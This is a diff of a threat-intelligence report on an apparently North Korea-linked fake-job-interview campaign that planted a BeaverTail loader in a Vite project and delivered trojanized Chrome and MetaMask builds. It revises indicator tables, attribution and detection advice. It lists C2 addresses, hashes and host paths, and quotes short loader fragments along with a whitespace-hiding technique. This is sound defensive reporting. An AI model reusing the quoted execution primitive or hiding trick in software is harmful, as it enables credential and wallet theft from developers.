+| `9ff923e481be7714f19a8aad6b4b988fb6370b0e14db131e1c27a47c620446bb` | Stage 3 DMG/XZ - trojanized Chrome, retrieved from `146.70.24[.]211:4553/api/dd`, 2026-03-23 |
+| `d552a58a137c0ca1d95f70c6f07a2cbce0d8c0a60bd5ec37d4bad7c97b6bf99a` | Stage 3 ZIP - trojanized MetaMask 13.16.0, retrieved from `146.70.24[.]211:4553/api/dm`, 2026-03-23 |
+| `116fa81f492cc851c66fb0bbf4b69165c0d6ddaa163c57c039221761bcefd392` | MetaMask `manifest.json` - extracted from Stage 3 ZIP |
+| `a4fb63bdb311b6cecb1f572310f1cc8c30cb85aa8d3ed5a164ec2d39a55c6e9a` | MetaMask `ui-20.js` - contains injected password-exfiltration code |
+| `3caed7372c3799e2aad5b207f8dc085b08ec90095ca37cce34a2bb36e6f73bd6` | C2 probe response - `45.61.130[.]84/api/service/makelog`, 2026-03-23 |
+| `c4f20ff26e2c9f7c9460943ed7cedd5df6a0cc0d34a097ffd146f1513e810eb4` | C2 probe response - `146.70.24[.]211:4553/api/dech_result`, 2026-03-24 |
+| `9bfb1976ecba683c930f68e10216a26f7c4684896b9a66f6201a2ac67f2c28ac` | Git commit log with author metadata |
+| `45cb10ac5413a50b8920841ffb79d9b1572d7a81af181834e7ca3fa1b118887a` | Full diff of commit `275d524` - `vite.config.js` execution trigger |
 
 ### Host Indicators
 
@@ -330,14 +369,19 @@ This confirms a Windows Server host running an Express.js application referred t
 
 | Indicator | Type | Notes |
 |---|---|---|
-| `bitbucket.org/fortegroup-org/mocorex` | Repository | Malicious lure repository |
-| `275d524228cda97eca2601361d2142364fa1f3ce` | Commit | `vite.config.js` execution trigger, authored `dnaleor@gmail.com`, 2026-03-02 |
-| `55da152f17b57b88efe566f62963988db959f59e` | Commit | `vite.cookie.js` "Complete implementation", authored `dnaleor@gmail.com`, 2026-02-08 |
-| `dnaleor@gmail.com` | Git author | Operator identity - authored both the loader and its execution trigger |
-| Horizontal whitespace before payload in JS file | Code pattern | Contagious Interview obfuscation signature |
-| JSONkeeper `cookie` field execution | Code pattern | Documented BeaverTail delivery mechanism |
-| `require('./public/vite.cookie')` in `vite.config.js` | Code pattern | Unconditional execution trigger on any Vite command |
-| `new Function('require', payload)(require)` | Code pattern | Persistent BeaverTail execution primitive |
+| `bitbucket[.]org/fortegroup-org/mocorex` | Repository | Malicious lure repository |
+| `fortegroup-org` | Bitbucket account | Fabricated organisation/persona infrastructure |
+| `31ea638fde20a03052b46490faa3e7e431ac6f8f` | Commit | Preserved HEAD; merge commit authored by `Fabian <Fabian@chainsquad.com>`, 2026-03-02T23:59:59+09:00 |
+| `Fabian <Fabian@chainsquad.com>` | Git author persona | 25 commits; authored preserved HEAD and commits touching execution artifacts in derived map |
+| `dnaleor <dnaleor@gmail.com>` | Git author persona | 31 commits; branch name appears in preserved HEAD merge subject |
+| `fsboehme <fsboehme@gmail.com>` | Git author persona | 30 commits |
+| `fengshanshan <fengshanshn@icloud.com>` | Git author persona | 19 commits |
+| `94873d3f5231c96a77cd0f43bcb41fbda637208a` | Commit | Commit touching `vite.config.js` execution artifact, authored by `Fabian <Fabian@chainsquad.com>` |
+| `0f502cc528a22e42a41a68d88d0ebd0f6e0559f0` | Commit | Commit touching `vite.cookie.js` skeleton, authored by `Fabian <Fabian@chainsquad.com>` |
+| Horizontal whitespace before payload in JS file | Code pattern | 380 leading horizontal whitespace characters before the JSONkeeper request on line 529 |
+| JSONkeeper `cookie` field execution | Code pattern | BeaverTail staging pattern |
+| `require('./public/vite.cookie')` in `vite.config.js` | Code pattern | Top-level execution trigger when Vite loads the config |
+| `new Function('require', payload)(require)` | Code pattern | BeaverTail execution primitive |
 
 ---
 
@@ -345,28 +389,22 @@ This confirms a Windows Server host running an Express.js application referred t
 
 **Assessed confidence: Medium**
 
-This campaign presents a dense cluster of TTPs consistent with documented Lazarus Group / Contagious Interview activity:
+This campaign is assessed as **DPRK-linked Contagious Interview-aligned** activity at medium confidence. The assessment is based on tradecraft, malware-family alignment, and campaign objective rather than a confirmed real-world operator identity.
 
-- LinkedIn-based recruitment lure targeting developers - the defining characteristic of Contagious Interview since its first documentation by Palo Alto Unit42 in November 2023.
-- Bitbucket-hosted lure repository - Bitbucket has been a documented Contagious Interview delivery platform since early 2025, with dozens of reported takedowns in the Atlassian Community forums.
-- JSONkeeper as a payload staging host - NVISO documented this specific technique (JSONkeeper, JSONsilo, npoint.io as BeaverTail staging hosts) in November 2025, and it remains an active operator preference at time of writing.
-- `cookie` field in the JSON response containing the BeaverTail payload - this is a consistent, documented BeaverTail signature across all reported variants.
-- Multi-alphabet base-encoding obfuscation - matches the October 2025 BeaverTail update noted in Microsoft's March 2026 report, which introduced heavier obfuscation to hinder static analysis.
-- Hardcoded campaign UID across all stages - consistent with documented BeaverTail operator infrastructure management patterns.
-- Crypto wallet credential theft as the terminal objective - consistent with Lazarus Group's known financial motivation and focus on cryptocurrency targets.
+The strongest points are: the LinkedIn recruiter/technical-assignment lure; Bitbucket-hosted developer project delivery; JSONkeeper staging of BeaverTail-like JavaScript payload material; the JSON `cookie` field payload delivery pattern; cross-platform JavaScript execution through `new Function('require', payload)(require)`; explicit cryptocurrency-wallet targeting; and a macOS follow-on chain focused on Chrome and MetaMask compromise. MITRE tracks Contagious Interview as a North Korea-aligned group targeting software developers and cryptocurrency-related users, and MITRE separately documents BeaverTail as a JavaScript/C++ malware family used by North Korea-affiliated Contagious Interview/DeceptiveDevelopment activity.
 
-The trojanized MetaMask component represents an escalation from previously documented BeaverTail campaigns, which typically targeted wallet files on disk. Replacing the browser binary to intercept the master password at the point of entry is a more capable and more persistent technique. It is unclear at this time whether this component is novel to this campaign or has been observed elsewhere without public disclosure.
+The trojanized MetaMask component represents a higher-impact terminal capability than simple file harvesting: it targets the unlock workflow itself. However, whether this exact component is unique to this campaign or part of a broader unpublished toolset should remain open until additional samples or third-party reporting corroborate it.
 
-Attribution should not be asserted beyond TTP similarity without additional corroborating intelligence.
+The Git author identities `Fabian <Fabian@chainsquad.com>`, `dnaleor <dnaleor@gmail.com>`, `fsboehme <fsboehme@gmail.com>`, and `fengshanshan <fengshanshn@icloud.com>`, together with the `fortegroup-org` Bitbucket organisation, should be treated as persona and infrastructure artifacts. They are useful for clustering but are not reliable real-world identity indicators.
+
+Attribution should not be asserted beyond this confidence level without additional corroborating intelligence such as shared infrastructure administration, overlapping payload build chains, wallet movement, or independent victim telemetry.
 
 **Prior reporting:**
 - [NVISO - Contagious Interview Actors Now Utilize JSON Storage Services](https://blog.nviso.eu/2025/11/13/contagious-interview-actors-now-utilize-json-storage-services-for-malware-delivery/)
 - [Microsoft - Contagious Interview: Malware Delivered Through Fake Developer Job Interviews](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
-- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/)
+- [Palo Alto Unit42 - Contagious Interview](https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/)
 - [SANS CTI Summit 2026 - Hunting North Korea's Contagious Interview Operation](https://www.sans.org/presentations/hunting-north-koreas-state-sponsored-contagious-interview-operation-attacks-on-developers-via-the-software-supply-chain)
 - [MITRE ATT&CK - Contagious Interview (G1052)](https://attack.mitre.org/groups/G1052/)
-
----
 
 ## Remediation
 
@@ -384,10 +422,10 @@ Attribution should not be asserted beyond TTP similarity without additional corr
 
 ### Network-Level Detection
 
-- Block and alert on all outbound connections to `45.61.130.84`, `146.70.24.211`, and `184.174.97.8` (all ports).
+- Block and alert on all outbound connections to `45.61.130[.]84`, `146.70.24[.]211`, and `184.174.97[.]8` (all ports).
 - Alert on outbound HTTP (not HTTPS) POST requests from browser processes to non-standard ports, particularly port 4553.
 - Alert on HTTP POST requests containing JSON bodies with a `data` field originating from Chrome or Chromium processes to any external IP on a non-standard port.
-- Monitor for outbound connections to `jsonkeeper.com` from Node.js processes on developer workstations; legitimate use is rare and any such connection should be investigated.
+- Monitor for outbound connections to `jsonkeeper[.]com` from Node.js processes on developer workstations; legitimate use is rare and any such connection should be investigated.
 - Create IDS signatures for HTTP requests to `/api/service/makelog`, `/api/service/process/`, `/api/dech_result`, and `/upload` on ports 4556 and 4558.
 
 ### Host-Level Detection and Hardening
@@ -395,28 +433,9 @@ Attribution should not be asserted beyond TTP similarity without additional corr
 - Check for the presence of `/Applications/tempapp` and `~/Library/Caches/com.apple.chromo`; either indicates active compromise.
 - Verify the SHA256 of `~/Library/Application Support/Google/Chrome/Default/Extensions/nkbihfbeogaeaoehlefnkodbefgpgknn/` against the official MetaMask release for your installed version. Any mismatch indicates a trojanized extension.
 - Monitor filesystem events for writes to `~/Library/Caches/com.apple.chromo` and renames of `/Applications/Google Chrome.app`.
-- Run developer assessments from unknown sources exclusively in an isolated VM or container with restricted network egress and ephemeral storage. Running `npm install` in an untrusted repository must never be treated as a safe operation.
+- Run developer assessments from unknown sources exclusively in an isolated VM or container with restricted network egress and ephemeral storage. Running install or development commands in an untrusted repository must never be treated as safe.
 - Audit all `public/` directory JavaScript files in Vite/React projects for horizontal whitespace anomalies before execution. Malicious code pushed off-screen is invisible without explicit horizontal scroll inspection.
 
----
-
-## Appendix: Evidence Artifacts
-
-| SHA256 | Description |
-|---|---|
-| `3538dca5a5eeb50d26b9ee7c6ad0ea5a63af4fe49b7c9aa242a7b06dce34501d` | `public/vite.cookie.js` - Stage 1 loader, mocorex HEAD |
-| `52b3f9eeda915ff2e64687f31c2b095dd83e95d19097de619ff956a1e8a5419c` | `vite.config.js` - execution trigger containing `require('./public/vite.cookie')` |
-| `3dd949a7a16db7d6f1a677f6c8abeeca2695e4e95cb6174b69b0e71dcf570bbc` | Stage 2 payload capture (full headers) - BeaverTail retrieved from `jsonkeeper.com/b/5SA4R`, 2026-03-23 |
-| `0ca3a74ac972080a2f7a915044abd81d95338afde17aeae26af6f7a31c16e3ec` | Stage 2 payload capture (second probe) - `jsonkeeper.com/b/5SA4R`, 2026-03-23 |
-| `5f69913d6292ae9b879536ab8c08c9938ffbed352733ae7896f06d4ab09208cc` | Stage 2 payload body - BeaverTail (`stage2-payload-raw.json`) |
-| `9ff923e481be7714f19a8aad6b4b988fb6370b0e14db131e1c27a47c620446bb` | Stage 3 DMG (XZ) - trojanized Chrome, retrieved from `146.70.24.211:4553/api/dd`, 2026-03-23 |
-| `d552a58a137c0ca1d95f70c6f07a2cbce0d8c0a60bd5ec37d4bad7c97b6bf99a` | Stage 3 ZIP - trojanized MetaMask 13.16.0, retrieved from `146.70.24.211:4553/api/dm`, 2026-03-23 |
-| `116fa81f492cc851c66fb0bbf4b69165c0d6ddaa163c57c039221761bcefd392` | MetaMask `manifest.json` - extracted from Stage 3 ZIP |
-| `a4fb63bdb311b6cecb1f572310f1cc8c30cb85aa8d3ed5a164ec2d39a55c6e9a` | MetaMask `ui-20.js` - contains injected password exfiltration code |
-| `3caed7372c3799e2aad5b207f8dc085b08ec90095ca37cce34a2bb36e6f73bd6` | C2 probe response - `45.61.130.84/api/service/makelog`, 2026-03-23 |
-| `c4f20ff26e2c9f7c9460943ed7cedd5df6a0cc0d34a097ffd146f1513e810eb4` | C2 probe response - `146.70.24.211:4553/api/dech_result`, 2026-03-24 |
-| `9bfb1976ecba683c930f68e10216a26f7c4684896b9a66f6201a2ac67f2c28ac` | Git commit log with author metadata (full history) |
-| `45cb10ac5413a50b8920841ffb79d9b1572d7a81af181834e7ca3fa1b118887a` | Full diff of commit `275d524` - `vite.config.js` execution trigger |
 
 ---
 
